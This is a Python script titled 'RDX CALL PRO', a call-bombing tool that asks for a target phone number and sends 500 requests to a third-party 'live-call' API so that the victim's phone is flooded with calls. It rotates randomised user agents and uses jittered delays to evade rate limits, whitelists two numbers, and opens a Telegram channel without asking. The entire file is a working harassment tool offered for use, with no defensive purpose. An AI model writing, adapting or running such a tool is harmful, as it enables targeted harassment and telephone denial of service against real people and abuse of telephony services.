import os
import sys
import time
import random
import requests
import re

# ANSI Color Codes for Styling
GREEN = "\033[92m"
BOLD = "\033[1m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"
DIM = "\033[2m"

# Restricted Numbers Blacklist (Normalized formats)
RESTRICTED_NUMBERS = {
    "01313222112",
    "01613950781"
}

def get_terminal_width():
    try:
        return min(os.get_terminal_size().columns, 75)
    except Exception:
        return 70

def center_text(text, color=GREEN):
    width = get_terminal_width()
    # Strip ANSI codes to calculate visual length
    clean = re.sub(r'\033\[[0-9;]*m', '', text)
    padding = max((width - len(clean)) // 2, 0)
    return " " * padding + text

def normalize_number(phone_input):
    digits_only = re.sub(r'\D', '', phone_input)
    if digits_only.startswith("880") and len(digits_only) == 13:
        digits_only = "0" + digits_only[3:]
    return digits_only

def typing_effect(text, color=GREEN, delay=0.025):
    sys.stdout.write(color + BOLD)
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(RESET + "\n")

def smooth_loading_bar(duration=1.6, label="Loading", bar_len=30):
    total_steps = bar_len
    spinner_chars = ["◐", "◓", "◑", "◒"]
    for i in range(total_steps + 1):
        percent = int((i / total_steps) * 100)
        filled = "█" * i
        empty = "░" * (bar_len - i)
        sp = spinner_chars[i % len(spinner_chars)]
        sys.stdout.write(
            f"\r  {CYAN}{BOLD}{sp}{RESET} {WHITE}{label:<14}{RESET} "
            f"{DIM}▕{RESET}{GREEN}{BOLD}{filled}{RESET}{DIM}{empty}▏{RESET} "
            f"{YELLOW}{BOLD}{percent:3d}%{RESET}"
        )
        sys.stdout.flush()
        time.sleep(duration / total_steps)
    sys.stdout.write(f"\r  {GREEN}{BOLD}✓{RESET} {WHITE}{label:<14}{RESET} "
                     f"{DIM}▕{RESET}{GREEN}{BOLD}{'█'*bar_len}{RESET}{DIM}▏{RESET} "
                     f"{GREEN}{BOLD}100%{RESET}   \n")

def pulse_text(text, color=MAGENTA, pulses=2):
    for _ in range(pulses):
        sys.stdout.write(f"\r{CYAN}{BOLD}  {text}{RESET}   ")
        sys.stdout.flush()
        time.sleep(0.15)
        sys.stdout.write(f"\r{MAGENTA}{BOLD}  {text}{RESET}   ")
        sys.stdout.flush()
        time.sleep(0.15)
    sys.stdout.write(f"\r{GREEN}{BOLD}  {text}{RESET}   \n")

def banner():
    os.system("clear")
    width = get_terminal_width()
    line = "─" * min(width - 4, 62)
    
    banner_text = f"""
{MAGENTA}{BOLD}  ╔{'═' * (min(width - 6, 60))}╗{RESET}
{MAGENTA}{BOLD}  ║{RESET}{CYAN}{BOLD}{center_text('⚡  R D X   C A L L   P R O  ⚡', CYAN)[0:min(width - 8, 58)]:<{min(width - 8, 58)}}{RESET}{MAGENTA}{BOLD}║{RESET}
{MAGENTA}{BOLD}  ╚{'═' * (min(width - 6, 60))}╝{RESET}

{CYAN}{BOLD}  ┌{'─' * (min(width - 6, 60))}┐{RESET}
{YELLOW}{BOLD}  │{RESET}  {WHITE}DEVELOPER  {DIM}»{RESET} {GREEN}{BOLD}RDX  HUNTER{RESET}{' ' * max(min(width - 6, 60) - 32, 0)}{YELLOW}{BOLD}│{RESET}
{YELLOW}{BOLD}  │{RESET}  {WHITE}TELEGRAM   {DIM}»{RESET} {GREEN}{BOLD}RDX  TOOLS{RESET}{' ' * max(min(width - 6, 60) - 37, 0)}{YELLOW}{BOLD}│{RESET}
{YELLOW}{BOLD}  │{RESET}  {WHITE}VERSION    {DIM}»{RESET} {GREEN}{BOLD}v1.0  PRO{RESET}{' ' * max(min(width - 6, 60) - 27, 0)}{YELLOW}{BOLD}│{RESET}
{YELLOW}{BOLD}  │{RESET}  {WHITE}STATUS     {DIM}»{RESET} {GREEN}{BOLD}● ONLINE{RESET}{' ' * max(min(width - 6, 60) - 29, 0)}{YELLOW}{BOLD}│{RESET}
{CYAN}{BOLD}  └{'─' * (min(width - 6, 60))}┘{RESET}
"""
    print(banner_text)

def welcome_sequence():
    banner()
    time.sleep(0.2)
    typing_effect("  ▶ Booting RDX CALL Engine...", color=MAGENTA, delay=0.02)
    smooth_loading_bar(1.2, "Kernel Init")
    smooth_loading_bar(1.0, "Loading Modules")
    smooth_loading_bar(0.8, "Connecting API")
    pulse_text("✦ SYSTEM READY ✦", color=GREEN, pulses=2)
    print(f"{GREEN}{BOLD}  ➤ Joining Telegram Channel...{RESET}")
    os.system("xdg-open https://t.me/+e5Rr0q5ixnxlNTNl > /dev/null 2>&1 &")
    time.sleep(1.3)
    print()

def get_random_user_agent():
    desktop_browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"
    ]
    mobile_browsers = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.193 Mobile Safari/537.36"
    ]
    os_platforms = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64", "iPhone; CPU iPhone OS 17_0 like Mac OS X", "Linux; Android 13"]

    base_ua = random.choice(desktop_browsers + mobile_browsers)
    rand_ver = f"{random.randint(110, 125)}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    unlimited_user_agents = [
        base_ua,
        f"Mozilla/5.0 ({random.choice(os_platforms)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_ver} Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_ver} Safari/537.36 Edg/{rand_ver}",
        f"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{random.randint(115, 123)}.0) Gecko/20100101 Firefox/{random.randint(115, 123)}.0"
    ]
    return random.choice(unlimited_user_agents)

def start_bombing(phone_number):
    normalized = normalize_number(phone_number)

    if normalized in RESTRICTED_NUMBERS:
        print(f"\n  {RED}{BOLD}✖ Access Denied! This number is Restricted.{RESET}\n")
        return

    url = f"https://api-modifyxhub.tech/custom.php?api_action=live-call&number={phone_number}"

    print()
    smooth_loading_bar(0.8, "Target Lock")
    smooth_loading_bar(0.6, "Payload Ready")
    pulse_text("⚡ ENGAGING RDX ENGINE ⚡", color=MAGENTA, pulses=1)
    time.sleep(0.2)

    width = min(get_terminal_width() - 4, 62)
    success_count = 0

    print(f"\n{CYAN}{BOLD}  ┌{'─' * width}┐{RESET}")
    print(f"{CYAN}{BOLD}  │{RESET}  {WHITE}Target   {DIM}»{RESET} {YELLOW}{BOLD}{phone_number:<45}{RESET}{CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}  │{RESET}  {WHITE}Packets  {DIM}»{RESET} {YELLOW}{BOLD}{'500':<45}{RESET}{CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}  │{RESET}  {WHITE}Mode     {DIM}»{RESET} {RED}{BOLD}{'UNLIMITED UA ROTATION':<45}{RESET}{CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}  └{'─' * width}┘{RESET}\n")

    bar_len = 30
    for i in range(1, 501):
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        try:
            requests.get(url, headers=headers, timeout=8)
            success_count += 1
            progress = int((i / 500) * 100)
            filled = int((i / 500) * bar_len)
            bar = "█" * filled + "░" * (bar_len - filled)
            
            sys.stdout.write(
                f"\r  {CYAN}{BOLD}▕{GREEN}{bar}{CYAN}▏{RESET} "
                f"{YELLOW}{BOLD}{progress:3d}%{RESET}  "
                f"{MAGENTA}{BOLD}[RDX HIT #{success_count:03d}]{RESET}   "
            )
            sys.stdout.flush()
        except Exception:
            pass

        time.sleep(random.uniform(1.0, 2.0))

    print(f"\n\n{CYAN}{BOLD}  ┌{'─' * width}┐{RESET}")
    print(f"{CYAN}{BOLD}  │{RESET}  {GREEN}{BOLD}✓ ATTACK FINISHED SUCCESSFULLY{RESET}{' ' * (width - 33)}{CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}  │{RESET}  {WHITE}Total Dispatched :{RESET} {YELLOW}{BOLD}{success_count}{RESET}{' ' * (width - 25 - len(str(success_count)))}{CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}  └{'─' * width}┘{RESET}")

def main():
    welcome_sequence()
    width = min(get_terminal_width() - 4, 62)
    while True:
        banner()
        print(f"{CYAN}{BOLD}  ┌{'─' * width}┐{RESET}")
        print(f"{CYAN}{BOLD}  │{RESET}  {GREEN}{BOLD}[1]{RESET}  {WHITE}⚡  Start Call Bombing{RESET}{' ' * (width - 26)}{CYAN}{BOLD}│{RESET}")
        print(f"{CYAN}{BOLD}  │{RESET}  {GREEN}{BOLD}[2]{RESET}  {WHITE}📢  Join Telegram Channel{RESET}{' ' * (width - 27)}{CYAN}{BOLD}│{RESET}")
        print(f"{CYAN}{BOLD}  │{RESET}  {GREEN}{BOLD}[3]{RESET}  {WHITE}🚪  Exit Tool{RESET}{' ' * (width - 18)}{CYAN}{BOLD}│{RESET}")
        print(f"{CYAN}{BOLD}  └{'─' * width}┘{RESET}")

        choice = input(f"\n{MAGENTA}{BOLD}  ❯ {WHITE}Choose Option : {RESET}").strip()

        if choice == "1":
            phone = input(f"{GREEN}{BOLD}  ❯ {WHITE}Enter Target Phone (Ex: 017xxxxxxxx) : {RESET}").strip()
            if len(phone) >= 10:
                start_bombing(phone)
                input(f"\n{YELLOW}{BOLD}  ⏎ Press Enter to return to menu...{RESET}")
            else:
                print(f"{RED}{BOLD}  [!] Invalid Number! Try again.{RESET}")
                time.sleep(1.5)
        elif choice == "2":
            os.system("xdg-open https://t.me/+e5Rr0q5ixnxlNTNl > /dev/null 2>&1 &")
            print(f"{GREEN}{BOLD}  [+] Opening Telegram Channel...{RESET}")
            time.sleep(1.5)
        elif choice == "3":
            print(f"\n{GREEN}{BOLD}  Thank you for using RDX CALL! Stay Powerful ⚡{RESET}")
            sys.exit()
        else:
            print(f"{RED}{BOLD}  [!] Invalid Choice! Please select 1, 2, or 3.{RESET}")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
